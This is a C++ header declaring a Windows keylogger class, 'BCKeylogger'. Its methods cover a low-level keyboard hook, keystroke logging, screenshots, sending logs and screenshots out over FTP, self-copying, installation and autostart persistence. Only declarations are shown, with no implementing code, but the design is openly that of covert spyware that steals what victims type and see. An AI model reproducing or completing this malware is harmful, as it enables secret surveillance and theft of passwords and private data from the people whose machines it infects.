#pragma once

#include <stdio.h>

#include <thread>
#include <functional>
#include <memory>

#include <string>
#include <windows.h>
#include <wininet.h>
#include <winuser.h>
#include <conio.h>
#include <time.h>
#include <fstream>
#include <strsafe.h>
#include <io.h>
#include <crtdefs.h>
#include <fstream>


	class BCKeylogger {
	public:
		BCKeylogger();
		void userpath();
		void screenshot(std::string file);
		void ftp_scrshot_send();
		void ftplogsend();
		void AutoCopy();
		void Install();
		int isCapsLock();
		DWORD KeyLogger();
		int StartKeyLogging();
		void AutoStart();
		void KLStart();
		std::fstream log_error_file;
		static std::shared_ptr<std::string> userlc;
		static BCKeylogger* s_instance;
		static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

	};

	std::shared_ptr<std::string> userlc = std::make_shared<std::string>();
	BCKeylogger* s_instance = new BCKeylogger;

